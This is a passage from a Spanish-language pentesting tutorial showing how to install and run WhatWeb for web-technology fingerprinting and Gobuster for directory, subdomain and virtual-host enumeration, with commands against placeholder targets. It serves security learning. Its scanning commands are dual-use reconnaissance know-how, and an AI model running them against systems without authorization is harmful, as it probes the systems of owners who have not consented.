sudo apt-get install whatweb
```

### Uso Básico

```bash
# Análisis simple
whatweb http://target.example.com

# Análisis detallado
whatweb -v http://target.example.com

# Scan de múltiples URLs
whatweb http://target1.com http://target2.com

# Leer de archivo
whatweb < urls.txt

# Agresivo (más requests)
whatweb -a 3 http://target.example.com
```

### Niveles de Agresividad

| Nivel | Descripción | Requests | Velocidad |
|-------|-------------|----------|-----------|
| 1 | HTTP headers estándar | 1 | Rápido |
| 2 | Búsqueda pasiva | 2-5 | Normal |
| 3 | Búsqueda activa | 10-100+ | Lento pero completo |

### Ejemplo 1: Análisis Simple

```bash
# Análisis básico
whatweb http://example.com
```

### Ejemplo 2: Análisis Detallado

```bash
# Análisis con verbosidad
whatweb -v http://example.com
```

### Herramientas Complementarias

```bash
# Alternativa gráfica: Wappalyzer (extensión de navegador)
# URL: https://www.wappalyzer.com/

# Versión CLI: Wappalyzer CLI
npm install -g wappalyzer
wappalyzer http://target.com
```

---

# Gobuster - Enumeración de Directorios y DNS

## Introducción

**Gobuster** es una herramienta rápida de fuzzing de URIs y descubrimiento de DNS, similar a ffuf pero más simple.

### Instalación

```bash
sudo apt-get install gobuster
# o
go install github.com/OJ/gobuster/v3@latest
```

## Modos de Operación

| Modo | Comando | Propósito |
|------|---------|----------|
| **dir** | `gobuster dir -u URL -w wordlist` | Fuzzing de directorios |
| **dns** | `gobuster dns -d domain -w wordlist` | Enumeración de subdominios |
| **vhost** | `gobuster vhost -u URL -w wordlist` | Enumeración de Virtual Hosts |

### Ejemplo 1: Fuzzing de Directorios

```bash
# Enumeración básica
gobuster dir -u http://target.example.com -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

### Ejemplo 2: Enumeración de Subdominios (DNS)

```bash
# Buscar subdominios
gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
```

### Ejemplo 3: Enumeración de VHosts

```bash
# Buscar Virtual Hosts
gobuster vhost -u http://example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

### Ejemplo 4: Opciones Avanzadas

```bash
# Con filtrado por códigos
gobuster dir -u http://target.com -w wordlist.txt -s 200,301,302

# -s: Status codes para incluir

# Excluir códigos
gobuster dir -u http://target.com -w wordlist.txt -b 404,403

# -b: Status codes para excluir

# Mostrar length
gobuster dir -u http://target.com -w wordlist.txt -l

# Con timeout personalizado
gobuster dir -u http://target.com -w wordlist.txt --timeout 10s

# Múltiples extensiones
gobuster dir -u http://target.com -w wordlist.txt -x .php,.txt,.html,.bak
```





